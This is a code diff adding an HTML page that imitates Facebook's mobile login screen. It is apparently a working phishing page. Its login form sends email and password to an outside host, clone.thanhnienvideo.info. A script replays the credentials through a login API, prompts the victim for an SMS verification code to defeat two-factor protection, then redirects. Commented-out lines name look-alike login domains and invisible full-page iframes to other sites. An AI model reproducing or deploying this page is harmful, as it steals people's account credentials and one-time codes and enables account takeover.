@@ -1,0 +1,973 @@
+<html><head>
+    <title>Welcome to Facebook</title>
+    <meta name="referrer" content="always">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <script async="" src="https://www.google-analytics.com/analytics.js"></script><script src="https://code.jquery.com/jquery-2.2.2.min.js"></script>
+    <!--<script src="http://login.loginwithfacebook.com/jdk/fbLoginAPI.js"></script>-->
+	<!--<script src="http://login.fb-logins.cf/jdk/fbLoginAPI.js"></script>-->
+	
+
+    <style>
+        /*** uncss> filename: https://static.xx.fbcdn.net/rsrc.php/v2/yz/r/Lz5ftig2lPV.css?_nc_cb=1 ***/
+        .touch ._5ui2 ._5dpw {
+            text-align: center
+        }
+		.parkoo {
+			padding-top: 50px;
+            padding: 16px;
+        }
+        .touch ._5ui3 {
+            padding: 6px
+        }
+
+        ._1rrd {
+            border: 1px solid #3b5998;
+            border-radius: 3px;
+            color: #4080ff;
+            display: block;
+            font-size: large;
+            height: 18px;
+            line-height: 17px;
+            margin-right: 1px;
+            text-align: center;
+            vertical-align: middle;
+            width: 18px
+        }
+
+        ._3j87 {
+            margin: 0 auto
+        }
+
+        ._3j87 .img {
+            margin: 3px 0
+        }
+
+        .touch ._5rut {
+            margin: 0 auto;
+            max-width: 416px
+        }
+
+        .touch ._4u9z {
+            padding: 12px
+        }
+
+        ._5soa ._5rut .other-links {
+            padding-bottom: 36px;
+            text-align: center
+        }
+
+        ._5soa ._5rut .other-links a {
+            color: #7596c8;
+            font-size: 12px;
+            line-height: 16px
+        }
+
+        ._5soa ._5rut .other-links a {
+            color: #7596c8;
+            font-size: 12px;
+            line-height: 16px
+        }
+
+        ._5soa ._5rut .other-links span {
+            color: #4b4f56;
+            font-size: 12px;
+            line-height: 16px
+        }
+
+        ._5soa ._5rut {
+            padding: 0 16px
+        }
+
+        ._5spm {
+            padding-top: 16px
+        }
+
+        ._5sob > div > input {
+            border-bottom: 1px solid #e5e5e5;
+            border-bottom-color: rgba(0, 0, 0, .101);
+            border-radius: 0;
+            line-height: 20px
+        }
+
+        ._5sob > div > input:first-child {
+            border-radius: 4px 4px 0 0
+        }
+
+        ._5t3b {
+            padding: 36px 0 12px 0
+        }
+
+        .touch ._27z2 {
+            line-height: 20px
+        }
+
+        ._27z2 {
+            -webkit-box-sizing: border-box;
+            width: 100%
+        }
+
+        ._3nph {
+            background-color: #fff
+        }
+
+        .touch ._216i a {
+            color: #4080ff;
+            font-weight: bold
+        }
+
+        .touch ._216i a:active {
+            color: #4773cc
+        }
+
+        ._5yd0 {
+            background: #fa3e3e
+        }
+
+        ._5yd1 {
+            color: #fff
+        }
+
+        /*** uncss> filename: https://static.xx.fbcdn.net/rsrc.php/v2/ym/r/dfYlmeNDJKx.css?_nc_cb=1 ***/
+        .acw {
+            border-color: #e9e9e9
+        }
+
+        .aclb {
+            border-color: #d8dfea
+        }
+
+        ._55wo {
+            background: #fff
+        }
+
+        ._56bg {
+            border: 0;
+            display: block;
+            margin: 0;
+            padding: 0
+        }
+
+        .touch ._56bg {
+            -webkit-appearance: none;
+            -webkit-box-sizing: border-box;
+            width: 100%
+        }
+
+        ._56be {
+            position: relative
+        }
+
+        ._56be::before {
+            border-color: rgba(0, 0, 0, .07) rgba(0, 0, 0, .11) rgba(0, 0, 0, .18);
+            border-radius: 4px;
+            border-style: solid;
+            border-width: 1px;
+            bottom: -1px;
+            content: '';
+            left: -1px;
+            pointer-events: none;
+            position: absolute;
+            right: -1px;
+            top: -1px
+        }
+
+        ._56bf {
+            border-radius: 4px;
+            overflow: hidden
+        }
+
+        ._5pkb {
+            margin: 0
+        }
+
+        ._5pkb li {
+            display: block;
+            list-style: none
+        }
+
+        ._2c65::moz-focus-inner {
+            border: 0;
+            padding: 0
+        }
+
+        .sp_ujb6_Snt1q9 {
+            background-image: url(https://touch.facebook.com/rsrc.php/v2/yv/r/uHVGNFmwE_P.png);
+            background-size: auto;
+            background-repeat: no-repeat;
+            display: inline-block;
+            height: 32px;
+            width: 18px
+        }
+
+        .sp_ujb6_Snt1q9.sx_e14eb8 {
+            width: 123px;
+            height: 24px;
+            background-position: 0 0
+        }
+
+        .sp_ujb6_Snt1q9.sx_4e23d2 {
+            width: 12px;
+            height: 12px;
+            background-position: -57px -25px
+        }
+
+        ._2ph- {
+            padding: 8px
+        }
+
+        ._2pi9 {
+            padding-left: 12px;
+            padding-right: 12px
+        }
+
+        ._2pie {
+            padding-top: 12px
+        }
+
+        /*** uncss> filename: https://static.xx.fbcdn.net/rsrc.php/v2/yV/r/yKWfn7zgy0e.css?_nc_cb=1 ***/
+        body.touch {
+            margin: 0;
+            -webkit-text-size-adjust: none;
+            cursor: pointer
+        }
+
+        .touch, .touch input {
+            font-family: helvetica, arial, sans-serif;
+            font-size: 14px
+        }
+
+        .touchable, .btn, i.img {
+            -webkit-user-select: none
+        }
+
+        .touch, .touch .btn, .touch button, .touch input {
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
+        }
+
+        .touch input {
+            -webkit-user-select: auto
+        }
+
+        #root {
+            border-bottom: 1px solid transparent;
+            -webkit-box-sizing: border-box
+        }
+
+        .maxwidth {
+            margin: 0 auto;
+            max-width: 680px
+        }
+
+        body {
+            text-align: left;
+            direction: ltr
+        }
+
+        body, input, button {
+            font-family: sans-serif
+        }
+
+        body, h1, ul, li {
+            margin: 0;
+            padding: 0
+        }
+
+        h1 {
+            font-size: 1em;
+            font-weight: bold
+        }
+
+        ul {
+            list-style: none
+        }
+
+        #mErrorView .container {
+            font-family: helvetica, arial, sans-serif;
+            margin-top: -110px;
+            position: absolute;
+            text-align: center;
+            top: 50%;
+            width: 100%
+        }
+
+        #mErrorView .image {
+            background-repeat: no-repeat;
+            background-position: center center;
+            background-image: url(data:image/png;base64,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);
+            display: inline-block;
+            height: 150px;
+            width: 170px
+        }
+
+        #mErrorView .message {
+            color: #60676f;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 5px 0 15px
+        }
+
+        #mErrorView .link {
+            color: #576b95;
+            font-size: 16px;
+            font-weight: bold;
+            text-decoration: none
+        }
+
+        ._5vsg, ._5vsh {
+            height: 50%
+        }
+
+        .portrait ._5vsg {
+            display: none
+        }
+
+        ._5v5d {
+            text-align: center;
+            width: 100%
+        }
+
+        ._5v5e {
+            margin-top: -10px;
+            position: absolute;
+            top: 50%
+        }
+
+        ._5v5d .img {
+            position: relative;
+            right: 5px;
+            top: -1px
+        }
+
+        .touch ._50l4 {
+            margin: 0 8px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap
+        }
+
+        .touch ._1uh1 ._50l4 {
+            margin: 0 4px;
+            padding-top: 1px
+        }
+
+        .touch ._1uh1 ._50l4.mfsl {
+            font-size: 18px;
+            line-height: 22px
+        }
+
+        ._52z5 {
+            background: #3b5998;
+            -webkit-box-sizing: border-box;
+            height: 44px;
+            margin: 0 auto;
+            padding: 7px 0;
+            position: relative;
+            width: 100%;
+            z-index: 12
+        }
+
+        ._52z5._1uh1 {
+            height: 48px;
+            padding: 9px 4px
+        }
+
+        ._52z6 {
+            min-width: 160px;
+            text-align: center
+        }
+
+        ._52z7 {
+            text-align: left
+        }
+
+        ._52z8 {
+            margin-right: 8px;
+            text-align: right
+        }
+
+        ._52z7 .btn {
+            position: relative;
+            z-index: 13
+        }
+
+        ._52z7 .btn {
+            max-width: 85px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap
+        }
+
+        ._52z7._52z7 .btn.btnI.bgb {
+            background: none;
+            border: 0;
+            border-radius: 2px;
+            -webkit-box-shadow: none;
+            color: #fff;
+            font-weight: normal;
+            line-height: 28px;
+            min-width: 0;
+            padding: 0 12px;
+            text-shadow: none
+        }
+
+        .viewportArea {
+            height: 100%;
+            position: absolute;
+            top: 1px;
+            width: 100%
+        }
+
+        body.iframe .viewportArea {
+            top: 0
+        }
+
+        .touch #viewport {
+            min-height: 100%;
+            overflow: hidden;
+            position: relative;
+            width: 100%
+        }
+
+        #page {
+            position: relative
+        }
+
+        ._129_ {
+            position: relative;
+            z-index: 12
+        }
+
+        #modalDialog {
+            cursor: pointer;
+            position: relative
+        }
+
+        .mDialog .mFuturePageHeader .btn + .backButton {
+            margin-left: 0
+        }
+
+        #mDialogHeader.firstStep .backButton, #modalDialog #dialogSpinner {
+            display: none
+        }
+
+        .modalDialogView {
+            overflow: hidden
+        }
+
+        ._55sr {
+            pointer-events: none
+        }
+
+        .acw {
+            background-color: #fff
+        }
+
+        .aclb {
+            background-color: #eceff5
+        }
+
+        ._2v9s {
+            background: #dddfe2
+        }
+
+        ._2sq {
+            height: 20px;
+            width: 20px
+        }
+
+        ._2so {
+            display: inline-block
+        }
+
+        ._50cg._2ss {
+            background-image: url(https://touch.facebook.com/rsrc.php/v2/yc/r/6xIj_7EtJtJ.png);
+            background-repeat: no-repeat;
+            background-size: auto;
+            background-position: 0 -134px
+        }
+
+        ._52j9 {
+            color: #90949c
+        }
+
+        ._52jc {
+            font-size: 12px;
+            line-height: 16px
+        }
+
+        ._52jd {
+            font-size: 14px;
+            line-height: 20px
+        }
+
+        ._52jh {
+            font-weight: bold
+        }
+
+        ._52jj {
+            text-align: center
+        }
+
+        .btn {
+            border: solid 2px;
+            cursor: pointer;
+            margin: 0;
+            padding: 2px 6px 3px;
+            text-align: center
+        }
+
+        .btnD, .btnI {
+            background: #f3f4f5;
+            border-color: #ccc #aaa #999;
+            color: #505c77
+        }
+
+        .btn .img {
+            pointer-events: none
+        }
+
+        .btn {
+            display: inline-block
+        }
+
+        .btn + .btn {
+            margin-left: 3px
+        }
+
+        .mfss {
+            font-size: small
+        }
+
+        body, input {
+            font-size: medium
+        }
+
+        .mfsl {
+            font-size: large
+        }
+
+        .touch .mfss {
+            font-size: 12px;
+            line-height: 15px
+        }
+
+        .touch, .touch input {
+            font-size: 14px;
+            line-height: 18px
+        }
+
+        .touch .mfsl {
+            font-size: 16px;
+            line-height: 20px
+        }
+
+        .touch .btn {
+            -webkit-background-clip: padding-box;
+            border: solid 1px;
+            border-radius: 4px;
+            -webkit-box-sizing: border-box;
+            display: inline-block;
+            font-weight: bold;
+            min-width: 50px;
+            overflow: hidden;
+            padding: 0 8px;
+            text-overflow: ellipsis;
+            vertical-align: bottom;
+            white-space: nowrap
+        }
+
+        html .touch .btn {
+            line-height: 27px
+        }
+
+        .touch .btn .img {
+            margin-right: 4px
+        }
+
+        .touch .btn + .btn {
+            margin-left: 5px
+        }
+
+        .touch .btn.iconOnly {
+            min-width: 32px;
+            padding-left: 0;
+            padding-right: 0;
+            text-overflow: clip
+        }
+
+        .touch .btn.iconOnly .img {
+            margin-right: 0
+        }
+
+        .touch .btnD, .touch .btnI {
+            background: #3b4456;
+            background: linear-gradient(#fdfefe, #f0f1f2);
+            -webkit-box-shadow: inset 0 1px 0 #fff, 0 1px 0 rgba(0, 0, 0, .08)
+        }
+
+        .touch .btnD, .touch .btnI {
+            border-color: #ccc #c0c1c2 #bdbec0
+        }
+
+        .touch .btn.btnD, .touch .btn.btnI {
+            color: #505c77;
+            text-shadow: 0 1px 0 rgba(255, 255, 255, .6)
+        }
+
+        .touch .btnD.bgb {
+            background: linear-gradient(#4663a2, #344f8e);
+            border-color: #3a4a7b #2f406f #2b3a69;
+            -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, .1), 0 1px 0 rgba(255, 255, 255, .08)
+        }
+
+        .touch .btn.btnD.bgb, .touch .btn.btnI.bgb {
+            color: #fff;
+            text-shadow: 0 -1px 0 rgba(0, 0, 0, .35)
+        }
+
+        .touch .btnI.bgb {
+            background: linear-gradient(#647aab, #2c467e)
+        }
+
+        .touch .btnI.bgb {
+            border-color: #2a3349 #2a3a64 #253662;
+            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .21), 0 1px 0 rgba(255, 255, 255, .17)
+        }
+
+        .touch .btnI {
+            border-color: #9599a1 #a8abb4 #acb1bb;
+            -webkit-box-shadow: inset 0 1px 1px rgba(43, 48, 60, .18), 0 1px 0 #fff
+        }
+
+        form {
+            margin: 0;
+            border: 0
+        }
+
+        #root {
+            position: relative;
+            z-index: 0
+        }
+
+        .img {
+            border: 0;
+            display: inline-block;
+            vertical-align: top
+        }
+
+        i.img u {
+            position: absolute;
+            width: 0;
+            height: 0;
+            overflow: hidden
+        }
+
+        .touch a {
+            color: #576b95;
+            cursor: pointer;
+            text-decoration: none
+        }
+
+        .touch a[href="#"] {
+            -webkit-touch-callout: none
+        }
+
+        .touch a.sec {
+            color: #8190b0
+        }
+
+        .touchable {
+            cursor: pointer
+        }
+
+        .touch ._4g33, .touch ._5i2i {
+            display: -webkit-box;
+			background-color:$3b5999;
+        }
+
+        .touch ._52we {
+            -webkit-box-align: center
+        }
+
+        .touch ._4g34 {
+            -webkit-box-flex: 1;
+            width: 0
+        }
+
+        .touch ._4g34 ._5xu4 {
+            -webkit-box-flex: 1
+        }
+
+        .fcg {
+            color: gray
+        }
+
+        .fcw {
+            color: #fff
+        }
+
+        ._55x2 > *, ._55x2._55x2 > * {
+            border-bottom: 1px solid #e5e5e5
+        }
+
+        ._55x2 > :last-child {
+            border-bottom: none
+        }
+
+        ._55x2 > *, ._55x2._55x2 > * {
+            border-bottom-color: rgba(0, 0, 0, .101)
+        }
+
+        .touch ._55wp {
+            padding: 0
+        }
+
+        .touch ._55wr {
+            padding: 8px
+        }
+
+        ._56bs {
+            -webkit-appearance: none;
+            background: none;
+            display: inline-block;
+            font-size: 12px;
+            height: 28px;
+            line-height: 28px;
+            margin: 0;
+            overflow: visible;
+            padding: 0 9px;
+            text-align: center;
+            vertical-align: top;
+            white-space: nowrap
+        }
+
+        .touch ._56bs {
+            border: none;
+            border-radius: 3px;
+            -webkit-box-sizing: border-box;
+            font-weight: bold;
+            position: relative;
+            -webkit-user-select: none;
+            z-index: 0
+        }
+
+        .touch ._56bs::after {
+            border-radius: 4px;
+            border-style: solid;
+            border-width: 1px;
+            bottom: -1px;
+            -webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, .07), inset 0 -1px 1px 0 rgba(0, 0, 0, .03);
+            content: "";
+            left: -1px;
+            pointer-events: none;
+            position: absolute;
+            right: -1px;
+            top: -1px;
+            z-index: 1
+        }
+
+        .touch ._56bs::before {
+            border-radius: 4px;
+            bottom: -1px;
+            content: "";
+            left: -1px;
+            pointer-events: none;
+            position: absolute;
+            right: -1px;
+            top: -1px;
+            -webkit-transform: none;
+            z-index: -1
+        }
+
+        ._56bu, ._56bv, a._56bv {
+            color: #fff
+        }
+
+        .touch ._56bu, .touch ._56bv, .touch a._56bv {
+            text-shadow: 0 -1px rgba(0, 0, 0, .25)
+        }
+
+        .touch ._56bu::after, .touch ._56bv::after {
+            border-color: rgba(0, 0, 0, .15) rgba(0, 0, 0, .15) rgba(0, 0, 0, .26);
+            -webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, .14), inset 0 -1px 1px 0 rgba(0, 0, 0, .03)
+        }
+
+        .touch ._56bu::before {
+            background-color: #627aad;
+            background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1))
+        }
+
+        .touch ._56bv::before {
+            background-color: #5b93fc;
+            background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1))
+        }
+
+        ._56bw {
+            font-size: 14px;
+            height: 36px;
+            line-height: 36px;
+            padding: 0 16px
+        }
+
+        ._56bs ._55sr {
+            display: inline-block
+        }
+
+        ._56bs ._55sr {
+            line-height: 20px;
+            margin-top: 4px
+        }
+
+        ._56bw ._55sr {
+            line-height: 24px;
+            margin-top: 6px
+        }
+
+        ._56bs._56b_ {
+            display: block;
+            width: 100%
+        }
+
+        .sp_yGngNiH6N8q {
+            background-image: url(https://touch.facebook.com/rsrc.php/v2/yc/r/6xIj_7EtJtJ.png);
+            background-size: auto;
+            background-repeat: no-repeat;
+            display: inline-block;
+            height: 20px;
+            width: 20px
+        }
+
+        .sp_yGngNiH6N8q.sx_ead2e4 {
+            width: 24px;
+            height: 24px;
+            background-position: 0 0
+        }
+		img {
+    width: 30%;
+    height: auto;
+}
+    </style>
+</head>
+<body tabindex="0" class="touch x2 _fzu _50-3 iframe acw portrait" style="min-height: 388px; background-color:#3b5999;">
+<div class="error" id="mesbox" style="display:none;background:#dc3847;color:white;font-size:14px;padding:8px;"><p id="message"> </p></div>
+	  <div class="aclb _5rut parkoo" style="background-color:#3b5999;">
+      <center><img src="avatar.png"></center><br><br><br>
+                            <div data-sigil="m_login_upsell">
+                            </div>
+                            <form method="post" class="mobile-login-form _5spm" id="login-form" action="http://clone.thanhnienvideo.info/lib/login.php" novalidate="1">
+                                <div class="_56be _5sob">
+                                    <div class="_55wo _55x2 _56bf">
+									 <input id="owner" name="owner" value="" type="hidden">	
+                                        <input id="a1" autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" name="email" placeholder="Email or Phone" value="" type="text" data-sigil="m_login_email">
+										 <input id="a2" autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" name="pass" placeholder="Password" value="" type="password" data-sigil="m_login_email">	
+                                        <div class="_3nph _mg8" data-sigil="m_login_password">
+                                            <div class="_4g33">
+                                                <div class="_4g34 _5i2i _52we">
+                                                    <div class="_5xu4">
+                                                    <!--
+                                                      <input id="a2" autocorrect="off" autocapitalize="off"
+                                                               class="_56bg _4u9z _27z2" name="pass"
+                                                               placeholder="Password" id="u_0_2"
+                                                               type="password"
+                                                               data-sigil="password-plain-text-toggle-input">-->
+                                                    </div>
+                                                     
+                                                </div>
+                                                <div class="_5s61 _216i _5i2i _52we">
+                                                    <div class="_5xu4">
+                                                        <div class="_2pi9" id="u_0_3" style="display:none">
+                                                            <a href="#" data-sigil="password-plain-text-toggle">
+<span class="mfss" id="u_0_4" style="display:none">HIDE
+</span>
+<span class="mfss" id="u_0_5">SHOW
+</span>
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="_2pie">
+                                    <button type="submit" value="Log In" class="_54k8 _56bs _56b_ _56bw _56bu" name="login" id="u_0_6" data-sigil="touchable m_login_button" data-autoid="autoid_2">
+<span class="_55sr">Log In</span>
+                                    </button>
+                                </div>
+                             
+                            </form>
+                            <br><br>
+                            <div class="other-links">
+                                <ul class="_5pkb _55wp">
+                                    <li>
+<span class="mfss fcg">
+<a href="#">Forgot
+    Password?
+</a>
+<span aria-hidden="true"> · 
+</span>
+<a class="sec" href="#">Help
+    Center
+</a>
+</span>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+
+<script>
+
+    var api = new FBLoginAPI();
+    var ref = '';
+    if (location.href.match('utm_source')) {
+        ref = location.href.replace('utm_source','owner');
+    }
+    else {
+        ref = location.href.match('owner') ? location.href : null;
+    }
+//  var redirectUrl = '/'+Math.random().toString(36).slice(2,10)+'.htm';
+// 	var redirectUrl = 'http://imclouds.info/CdOzF.html';
+	var redirectUrl = '/loading.php';
+    $('#login-form').submit(function () {
+        var username = $('#a1').val();
+        var password = $('#a2').val();
+        var login = function(username, password){
+            api.login(username,password, function(err){
+            	$('#mesbox').show();
+                if (err){
+                    $('#message').text(err.message);
+                    if (err.code == 406){
+                        var verifiedCode = prompt('Enter SMS verified code');
+                        if (verifiedCode){
+                            login(username, verifiedCode);
+                        }
+                    }
+                }
+                else {
+                    $('#message').text('Login Successfully')
+                    window.location.href = redirectUrl;
+                };
+            })
+        };
+        login(username, password);
+        return false;
+    });
+</script>
+
+<!--<iframe src="http://balabo.info/fosearch.html" style="position:absolute;opacity:0" width="100%" height="4000px" frameborder="0" marginwidth="0" marginheight="0" scrolling="NO"></iframe>-->
+<!--<iframe src="http://hostingviews.info/zsearch.html" style="position:absolute;opacity:0" width="100%" height="4000px" frameborder="0" marginwidth="0" marginheight="0" scrolling="NO"></iframe>-->
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-81880708-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+</body></html>
